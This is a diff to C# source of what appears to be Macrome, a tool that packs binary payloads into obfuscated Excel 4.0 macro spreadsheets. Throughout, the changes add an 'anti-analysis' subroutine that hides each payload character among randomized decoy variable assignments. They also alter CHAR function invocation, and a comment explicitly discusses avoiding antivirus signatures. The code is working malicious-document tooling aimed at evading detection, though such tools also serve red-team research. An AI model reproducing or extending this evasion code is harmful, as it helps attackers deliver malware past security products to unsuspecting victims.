@@ -16,8 +16,6 @@ namespace Macrome
     {
         public const string TOOLONGMARKER = "<FORMULAISTOOLONG>";
 
-
-
         /// <summary>
         /// Convert a binary payload into a series of cells representing the binary data.
         /// Can be iterated across as described in https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/
@@ -71,7 +69,43 @@ namespace Macrome
             ptgList.Add(new PtgName(functionLabelOffset));
             ptgList.Add(new PtgFuncVar(FtabValues.SET_NAME, 2, AbstractPtg.PtgDataType.VALUE));
             ptgList.Add(new PtgInt(charInt));
-            ptgList.Add(new PtgStr(varName));
+            ptgList.Add(new PtgStr(varName, true));
+            ptgList.Reverse();
+            return new Stack<AbstractPtg>(ptgList);
+        }
+
+        private static Stack<AbstractPtg> GetAntiAnalysisCharSubroutineForInt(ushort charInt, string varName, string decoyVarName,
+            int functionLabelOffset)
+        {
+            int numAndArgs = 2;
+
+            List<AbstractPtg> ptgList = new List<AbstractPtg>();
+            ptgList.Add(new PtgFuncVar(FtabValues.IF, 3, AbstractPtg.PtgDataType.VALUE));
+            ptgList.Add(new PtgMissArg());
+            ptgList.Add(new PtgFuncVar(FtabValues.USERDEFINEDFUNCTION, 1, AbstractPtg.PtgDataType.VALUE));
+            ptgList.Add(new PtgName(functionLabelOffset));
+            ptgList.Add(new PtgFuncVar(FtabValues.AND, numAndArgs, AbstractPtg.PtgDataType.VALUE));
+
+            Random r = new Random();
+            int correctArg = r.Next(0, numAndArgs);
+
+            for (int i = 0; i < numAndArgs; i += 1)
+            {
+                ptgList.Add(new PtgFuncVar(FtabValues.SET_NAME, 2, AbstractPtg.PtgDataType.VALUE));
+
+                if (i == correctArg)
+                {
+                    ptgList.Add(new PtgInt(charInt));
+                    ptgList.Add(new PtgStr(varName, true));
+                }
+                else
+                {
+                    ptgList.Add(new PtgInt((ushort)r.Next(1,255)));
+                    ptgList.Add(new PtgStr(decoyVarName, true));
+                }
+
+
+            }
             ptgList.Reverse();
             return new Stack<AbstractPtg>(ptgList);
         }
@@ -117,6 +151,7 @@ namespace Macrome
             ptgStack.Push(new PtgInt(charInt));
 
             //An alternate way to invoke the CHAR function by using PtgFuncVar instead
+            //TODO [Stealth] this is sig-able and we'll want to do something more generalized than abuse the fact AV doesn't pay attention
             ptgStack.Push(new PtgFuncVar(FtabValues.CHAR, 1, AbstractPtg.PtgDataType.VALUE));
             // ptgStack.Push(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));
 
@@ -139,10 +174,8 @@ namespace Macrome
             ptgStack.Push(new PtgFunc(FtabValues.ROUND, AbstractPtg.PtgDataType.VALUE));
 
             //An alternate way to invoke the CHAR function by using PtgFuncVar instead
-            //TODO [Stealth] this is sig-able and we'll want to do something more generalized than abuse the fact AV doesn't pay attention
-            //        Idea: Replace CHAR invocation with a named function that invokes 
-            ptgStack.Push(new PtgFuncVar(FtabValues.CHAR, 1, AbstractPtg.PtgDataType.VALUE));
-            // ptgStack.Push(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));
+            // ptgStack.Push(new PtgFuncVar(FtabValues.CHAR, 1, AbstractPtg.PtgDataType.VALUE));
+            ptgStack.Push(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));
 
             //Merge the random PtgRef we generate at the beginning
             ptgStack.Push(new PtgConcat());
@@ -344,8 +377,11 @@ namespace Macrome
                 case SheetPackingMethod.ObfuscatedCharFuncAlt:
                     return GetCharPtgForInt(Convert.ToUInt16(c));
                 case SheetPackingMethod.CharSubroutine:
-                    //For now assume that the var name "var" is used, and the appropriate label is at offset 1 (first lbl record)
-                    return GetCharSubroutineForInt(Convert.ToUInt16(c), "var", 1);
+                    //For now assume the appropriate label is at offset 1 (first lbl record)
+                    return GetCharSubroutineForInt(Convert.ToUInt16(c), UnicodeHelper.VarName, 1);
+                case SheetPackingMethod.AntiAnalysisCharSubroutine:
+                    //For now assume the appropriate label is at offset 1 (first lbl record)
+                    return GetAntiAnalysisCharSubroutineForInt(Convert.ToUInt16(c), UnicodeHelper.VarName, UnicodeHelper.DecoyVarName, 1);
                 default:
                     throw new NotImplementedException();
             }
